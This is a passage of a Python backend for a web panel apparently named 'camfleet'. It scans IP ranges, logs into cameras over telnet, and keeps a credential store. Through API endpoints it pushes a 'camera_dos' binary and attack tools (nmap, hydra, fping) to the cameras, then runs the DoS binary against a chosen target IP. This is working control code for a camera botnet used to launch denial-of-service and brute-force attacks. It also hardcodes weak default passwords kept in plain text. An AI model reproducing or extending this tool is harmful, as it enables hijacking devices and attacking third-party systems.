        t = threading.Thread(target=self._tools_monitor_loop, daemon=True)
        self._tools_monitor_thread = t
        t.start()

    def _tools_monitor_loop(self):
        while not getattr(self, '_tools_monitor_stop', True):
            time.sleep(5)
            if self._tools_monitor_stop:
                break
            for ip in list(self._tools_monitor_ips):
                try:
                    ok, out = self.pool.run_cmd(ip, "tail -10 /tmp/camtools.log 2>/dev/null", timeout=5)
                    if ok and out.strip():
                        last = out.strip().split("\n")[-1]
                        if last:
                            self._emit_log("exec", "info", f"[{ip}] {last[:200]}")
                except Exception:
                    pass

    def exec_stop(self, ips=None, mode="dos"):
        if ips is None:
            ips = self.pool.connected_ips()
        self._exec_monitor_stop = True
        self._tools_monitor_stop = True
        for ip in ips:
            self.pool.run_cmd(ip, "killall camera_dos cam-run fping nmap hydra 2>/dev/null", timeout=5)
            self._emit_log("exec", "info", f"[{ip}] killall camera_dos cam-run fping nmap hydra")
        return 200, {"accepted": True}

    # -- snapshot ------------------------------------------------------
    def snapshot(self):
        return {
            "scan": {"state": self.scan_state},
            "cameras": self.pool.status(),
            "connected_count": len(self.pool.connected_ips()),
            "host_ip": detect_host_ip(),
            "binaries": os.listdir(BINDIR) if os.path.isdir(BINDIR) else [],
        }


# --------------------------------------------------------- users & sessions
USERS_FILE = os.path.join(DATADIR, "users.json")


def _load_users():
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    default = {"admin": "admin123", "operator": "operator123"}
    with open(USERS_FILE, "w", encoding="utf-8") as f:
        json.dump(default, f, indent=2, ensure_ascii=False)
    return default


USERS = _load_users()
_sessions = {}
_sessions_lock = threading.Lock()


def session_create(username):
    token = uuid.uuid4().hex
    with _sessions_lock:
        _sessions[token] = username
    return token


def session_check(token):
    if not token:
        return None
    with _sessions_lock:
        return _sessions.get(token)


def session_delete(token):
    with _sessions_lock:
        _sessions.pop(token, None)


_user_state = {}
_user_state_lock = threading.Lock()


def get_user_state(username):
    with _user_state_lock:
        if username not in _user_state:
            pool = TelnetPool()
            hub = Hub()
            engine = Engine(pool, hub)
            _user_state[username] = {"engine": engine, "pool": pool, "hub": hub}
        return _user_state[username]


# ------------------------------------------------------------------ HTTP
class Handler(SimpleHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def __init__(self, *a, **k):
        super().__init__(*a, directory=FRONTEND, **k)

    def log_message(self, *a):
        pass

    def end_headers(self):
        path = urlparse(self.path).path
        if path.endswith((".js", ".css", ".html")) or path == "/":
            self.send_header("Cache-Control", "no-store, no-cache, must-revalidate")
            self.send_header("Pragma", "no-cache")
        super().end_headers()

    def _body(self):
        try:
            n = int(self.headers.get("Content-Length", "0") or "0")
            raw = self.rfile.read(n) if n else b""
            return json.loads(raw.decode("utf-8") or "{}")
        except Exception:
            return {}

    def _json(self, code, obj):
        data = json.dumps(obj, ensure_ascii=False).encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(data)

    # -- auth helpers --------------------------------------------------
    def _get_token(self):
        cookie = self.headers.get("Cookie", "")
        for part in cookie.split(";"):
            part = part.strip()
            if part.startswith("session="):
                return part[len("session="):]
        return None

    def _get_user(self):
        return session_check(self._get_token())

    def _auth(self):
        username = self._get_user()
        if not username:
            self._json(401, {"error": "Chưa đăng nhập"})
            return None
        return get_user_state(username), username

    # -- routing -------------------------------------------------------
    def do_GET(self):
        path = urlparse(self.path).path
        if path == "/api/health":
            return self._json(200, {"status": "ok", "uptime_s": int(time.time() - START_TS),
                                    "pexpect": pexpect is not None})
        if path == "/api/me":
            u = self._get_user()
            if not u:
                return self._json(401, {"error": "Chưa đăng nhập"})
            return self._json(200, {"username": u})

        if path == "/api/status":
            r = self._auth()
            if not r:
                return
            st, _ = r
            return self._json(200, st["engine"].snapshot())

        if path == "/api/stream":
            if self.headers.get("Upgrade", "").lower() == "websocket":
                return self._ws()
            return self._json(400, {"error": "expected websocket upgrade"})

        if path == "/api/credentials":
            if not self._get_user():
                return self._json(401, {"error": "Chưa đăng nhập"})
            return self._json(200, {"credentials": cred_list()})

        if path == "/api/cameras":
            r = self._auth()
            if not r:
                return
            st, _ = r
            return self._json(200, {"cameras": st["pool"].status(),
                                    "connected": st["pool"].connected_ips()})
        return super().do_GET()

    def do_POST(self):
        path = urlparse(self.path).path
        body = self._body()

        if path == "/api/login":
            u = (body.get("username") or "").strip()
            p = body.get("password", "")
            if USERS.get(u) != p:
                return self._json(401, {"error": "Sai tài khoản hoặc mật khẩu"})
            token = session_create(u)
            self.send_response(200)
            self.send_header("Content-Type", "application/json; charset=utf-8")
            self.send_header("Set-Cookie", f"session={token}; Path=/; HttpOnly; SameSite=Strict")
            data = json.dumps({"ok": True, "username": u}, ensure_ascii=False).encode("utf-8")
            self.send_header("Content-Length", str(len(data)))
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            self.wfile.write(data)
            audit({"dir": "in", "type": "login", "username": u})
            return

        if path == "/api/logout":
            token = self._get_token()
            if token:
                session_delete(token)
            self.send_response(200)
            self.send_header("Content-Type", "application/json; charset=utf-8")
            self.send_header("Set-Cookie", "session=; Path=/; HttpOnly; Max-Age=0")
            data = b'{"ok":true}'
            self.send_header("Content-Length", str(len(data)))
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            self.wfile.write(data)
            return

        r = self._auth()
        if not r:
            return
        st, username = r
        engine = st["engine"]
        pool = st["pool"]

        if path == "/api/scan/start":
            scan_range = (body.get("scan_range") or "").strip()
            if not valid_range(scan_range):
                return self._json(400, {"error": "Dải IP không hợp lệ"})
            code, resp = engine.scan_start(scan_range)
            return self._json(code, resp)

        if path == "/api/scan/stop":
            code, resp = engine.scan_stop_cmd()
            return self._json(code, resp)

        if path == "/api/connect":
            cameras = body.get("cameras", [])
            if not cameras:
                return self._json(400, {"error": "Chưa chọn camera"})
            code, resp = engine.connect_cameras(cameras)
            return self._json(code, resp)

        if path == "/api/disconnect":
            ip = (body.get("ip") or "").strip()
            if ip:
                code, resp = engine.disconnect_camera(ip)
            else:
                code, resp = engine.disconnect_all()
            return self._json(code, resp)

        if path == "/api/check-binary":
            ips = body.get("ips") or None
            code, resp = engine.check_binary(ips)
            return self._json(code, resp)

        if path == "/api/deploy":
            ips = body.get("ips") or None
            filename = body.get("filename", "camera_dos")
            code, resp = engine.deploy_binary(ips, filename)
            return self._json(code, resp)

        if path == "/api/deploy-tools":
            ips = body.get("ips") or None
            code, resp = engine.deploy_tools(ips)
            return self._json(code, resp)

        if path == "/api/delete-binary":
            ips = body.get("ips") or None
            filename = body.get("filename", "camera_dos")
            code, resp = engine.delete_binary(ips, filename)
            return self._json(code, resp)

        if path == "/api/delete-tools":
            ips = body.get("ips") or None
            code, resp = engine.delete_tools(ips)
            return self._json(code, resp)

        if path == "/api/exec":
            ips = body.get("ips") or pool.connected_ips()
            target_ip = (body.get("target_ip") or "").strip()
            args_str = (body.get("args") or "").strip()
            mode = (body.get("mode") or "dos").strip()
            if mode == "dos" and not target_ip:
                return self._json(400, {"error": "Thiếu target_ip"})
            code, resp = engine.exec_binary(ips, target_ip, args_str, mode=mode)
            return self._json(code, resp)

        if path == "/api/exec/stop":
            ips = body.get("ips") or None
            code, resp = engine.exec_stop(ips)
            return self._json(code, resp)

        if path == "/api/credentials":
            entry = body.get("entry") or body
            if not entry.get("ip"):
                return self._json(400, {"error": "Thiếu IP"})
            cred_save(entry)
            return self._json(200, {"accepted": True})

        if path == "/api/credentials/batch":
            entries = body.get("entries", [])
            cred_save_batch(entries)
            return self._json(200, {"accepted": True})

        return self._json(404, {"error": "not found"})

    def do_DELETE(self):
        path = urlparse(self.path).path
        if not self._get_user():
            return self._json(401, {"error": "Chưa đăng nhập"})
        m = re.match(r"^/api/credentials/(.+)$", path)
        if m:
            ip = m.group(1)
            cred_delete(ip)
            return self._json(200, {"accepted": True})
        return self._json(404, {"error": "not found"})

    # -- websocket -----------------------------------------------------
    def _ws(self):
        username = self._get_user()
        if not username:
            return self._json(401, {"error": "Chưa đăng nhập"})
        st = get_user_state(username)
        hub = st["hub"]

        key = self.headers.get("Sec-WebSocket-Key")
        if not key:
            return self._json(400, {"error": "missing Sec-WebSocket-Key"})
        accept = base64.b64encode(hashlib.sha1((key + WS_GUID).encode()).digest()).decode()
        self.send_response(101)
        self.send_header("Upgrade", "websocket")
        self.send_header("Connection", "Upgrade")
        self.send_header("Sec-WebSocket-Accept", accept)
        self.end_headers()

        client = WSClient(self.connection)
        hub.add(client)
        self.close_connection = True
        try:
            self._ws_loop(client)
        except Exception:
            pass
        finally:
            hub.remove(client)
            client.close()

    def _ws_loop(self, client):
        rf = self.rfile
        while True:
            h = rf.read(2)
            if not h or len(h) < 2:
                break
            b1, b2 = h[0], h[1]
            opcode = b1 & 0x0F
            masked = b2 & 0x80
            ln = b2 & 0x7F
            if ln == 126:
                ln = struct.unpack(">H", rf.read(2))[0]
            elif ln == 127:
                ln = struct.unpack(">Q", rf.read(8))[0]
            mask = rf.read(4) if masked else b"\x00\x00\x00\x00"
            payload = rf.read(ln) if ln else b""
            if masked and payload:
                payload = bytes(payload[i] ^ mask[i % 4] for i in range(len(payload)))
            if opcode == 0x8:
                break
            if opcode == 0x9:
                client.pong(payload)


def main():
    start_file_server()
    httpd = ThreadingHTTPServer(("0.0.0.0", PORT), Handler)
    httpd.daemon_threads = True
    host_ip = detect_host_ip()
    users_str = ", ".join(USERS.keys())
    print(f"[camfleet] backend on :{PORT}  host_ip={host_ip}", flush=True)
    print(f"[camfleet] users: {users_str}", flush=True)
    print(f"[camfleet] frontend: http://{host_ip}:{PORT}", flush=True)
    print(f"[camfleet] file server: http://{host_ip}:{FILE_PORT}", flush=True)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        for st in _user_state.values():
            st["pool"].disconnect_all()
        print("\n[camfleet] shutdown", flush=True)


if __name__ == "__main__":
    main()
